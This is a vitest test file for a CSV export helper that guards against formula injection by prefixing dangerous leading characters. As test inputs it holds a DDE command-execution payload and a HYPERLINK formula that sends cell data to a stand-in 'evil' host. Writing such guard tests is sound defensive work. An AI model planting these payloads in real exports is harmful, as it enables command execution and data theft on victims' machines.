// CWE-1236 — CSV formula injection guard test.
//
// The shared `toCsv` helper at src/lib/utils/csv.ts prepends a single
// quote to any string cell whose first character is one of the danger
// leaders (=, +, -, @, \t, \r) before quoting. This is the defense
// against an attacker who controls a string field that later lands
// in an exported CSV (account name, party name, JE memo, etc.) and
// crafts a payload like `=cmd|'/c calc'!A0` that Excel / Sheets /
// LibreOffice would execute as a formula on file open.
//
// This test lives in tests/ rather than next to the helper so it
// runs as part of the standard vitest sweep that goes against the
// dev Postgres — same suite that the rest of the platform uses.
//
// Why a UNIT test instead of an end-to-end CSV-endpoint test:
// the contract is at the helper level. Every CSV serializer in
// the codebase calls toCsv (after this PR's sweep). Proving the
// helper escapes correctly proves the contract holds everywhere.

import { describe, expect, it } from "vitest";

import { toCsv } from "@/lib/utils/csv";

describe("CSV formula injection — toCsv helper escapes danger leaders", () => {
  // The 6 characters Excel / Sheets treat as formula leaders.
  const LEADERS = ["=", "+", "-", "@", "\t", "\r"] as const;

  it("prepends a single quote to a cell starting with =", () => {
    const csv = toCsv([["=cmd|'/c calc'!A0"]]);
    // Payload contains `'` and `!` but no comma / double-quote /
    // newline, so RFC 4180 wrapping isn't triggered — the cell ships
    // as a bare string with just the formula-leader prefix.
    expect(csv).toBe(`'=cmd|'/c calc'!A0`);
  });

  it("prepends a single quote to a cell starting with each danger leader", () => {
    for (const leader of LEADERS) {
      const payload = `${leader}EVIL`;
      const csv = toCsv([[payload]]);
      // The escaped cell starts with `'`. Tab/CR also force a quote-wrap
      // since they're whitespace controls (RFC 4180 requires it).
      expect(csv.startsWith("'") || csv.startsWith('"\'')).toBe(true);
      expect(csv.includes(`'${leader}EVIL`)).toBe(true);
    }
  });

  it("does NOT escape a cell that starts with a benign character", () => {
    // Numbers, letters, parens, dollar — all safe.
    const csv = toCsv([["Acme Corp", "1000.00", "(parens)", "$50"]]);
    expect(csv).toBe("Acme Corp,1000.00,(parens),$50");
  });

  it("does NOT add a leading single quote to a numeric value passed as a number", () => {
    // Numbers stringify to e.g. "-50" which has a leading `-`. They're
    // NOT user-controlled strings — the caller passed a number. The
    // helper checks `typeof value === "string"` before applying the
    // escape, so numeric cells get straight-through coercion.
    const csv = toCsv([[-50, 100, -0.5]]);
    expect(csv).toBe("-50,100,-0.5");
  });

  it("preserves the standard RFC 4180 quote+escape for cells with commas + quotes", () => {
    // The standard quote-doubling behavior still works on top of the
    // formula-leader guard.
    const csv = toCsv([['ACME, INC ("Acme")']]);
    expect(csv).toBe(`"ACME, INC (""Acme"")"`);
  });

  it("guards against payloads that COMBINE danger leader + quote + comma", () => {
    // The realistic exploit: an attacker drops a name like
    // `=HYPERLINK("http://evil/?x=" & A1, "click")` that survives
    // through the import pipeline and lands in a CSV. The single-quote
    // prefix neutralizes the leading `=` so Excel reads the cell as
    // a literal text string, not a formula.
    const csv = toCsv([['=HYPERLINK("http://evil/?x=" & A1, "click")']]);
    // Cell starts with `'=HYPERLINK`, inside an RFC-4180 quote-wrap
    // (because it contains comma + double-quote).
    expect(csv.startsWith(`"'=HYPERLINK`)).toBe(true);
  });

  it("preserves null and undefined cells as empty (no leader risk)", () => {
    const csv = toCsv([["safe", null, undefined, "also safe"]]);
    expect(csv).toBe("safe,,,also safe");
  });

  it("joins multiple rows with \\n (RFC 4180-compatible CRLF or LF)", () => {
    const csv = toCsv([
      ["header1", "header2"],
      ["row1col1", "row1col2"],
    ]);
    expect(csv).toBe("header1,header2\nrow1col1,row1col2");
  });
});
